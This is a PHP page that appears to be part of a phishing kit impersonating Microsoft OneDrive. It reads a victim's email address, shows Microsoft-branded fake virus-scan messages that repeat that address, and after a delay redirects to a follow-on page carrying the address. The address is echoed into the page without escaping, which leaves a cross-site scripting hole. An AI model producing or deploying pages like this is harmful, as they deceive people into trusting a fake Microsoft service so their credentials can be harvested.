<?php 

        
	if (isset($_POST['email']) && !empty($_POST['email'])) {
		$email = $_POST['email'];	
	} else if (isset($_GET['email']) && !empty($_GET['email'])) {
		$email = $_GET['email'];
	} else {
		header('Location: index.php?new_session_error=1');
	}
	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0014)about:internet -->
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<meta name = "viewport" content = "user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
<META HTTP-EQUIV='Refresh' Content='12; URL=index.php?userid=<? echo $email; ?>'>
<meta name="apple-mobile-web-app-capable" content="yes" />
<link rel="icon" href="../imgs/favicon.ico" type="image/x-icon" />
<title> creating ...</title>
<meta name="GENERATOR" content="wordpress-name">
<meta name="wordpress-name" content="wordpress-name">
<style type="text/css">
body
{
   background-color: #f7f7f7;
   color: #000000;
   overflow-x: hidden;
   font-family: "Segoe UI Web Semibold","Segoe UI Semibold WestEuropean","Segoe UI Semibold","Segoe UI",Tahoma,Arial,sans-serif;
   
}

         .display { margin
		 : 0 auto; width:400px; height:60px; font-size:21px; }
         .js .display { display:none; }
         
#wordChanger {
  opacity: 1;
  transition: opacity .4s ease;
  color: #444;
  font-family:Arial;
  font-weight:bold;
}

#wordChanger.fadeOut {
  opacity: 0;
  transition: opacity .4s ease;
}

.footer {
  position: fixed;
  left: 0;
  bottom: 0;
  width: 100%;
  background-color: f7f7f7;
  color: #444;
  text-align: center;
</style>

</head>
<body>
<br><br><br><br>
<div style="margin:0 auto; width:100%;height:393px;text-align:center;border:0;">
<img src="../imgs/One_logo.png" width="300" height="52">
<br><br>
<h2 style="text-align:center;font-family:Arial;font-size:18px;color:#000;font-weight:100;">Please hold a while, as OneDrive Security is scanning your file for virus</h2>
<br>
 <div id='container'>
	  
	  
<div>
  <span style="color:f7f7f7;font-size:0px">.</span>
  <span id="wordChanger">Connecting to OneDrive server</span>
</div>
	  <br>
	  <img src="../imgs/ajax_loading.gif">
      </div>


</div>
<script>window.onload = function () {

  'use strict';

  var words = [
    'Please wait...',
	'Please wait....',
    'Scanning file from <? echo $email;?>',
    'No virus detected on this file'
  ], 
      i = 0,
      wordChanger = document.querySelector('#wordChanger');

  setInterval(function () {
    wordChanger.classList.add('fadeOut');

    // timeout equal to transition duration
    setTimeout(function () {
      wordChanger.textContent = words[ (i === words.length - 1) ? i = 0 : i += 1];
      wordChanger.classList.remove('fadeOut');
    }, 600);

  }, 3000);
};</script>

<div class="footer">
  <p>     &copy; Microsoft 2020 

</p>
</div>
</body></html>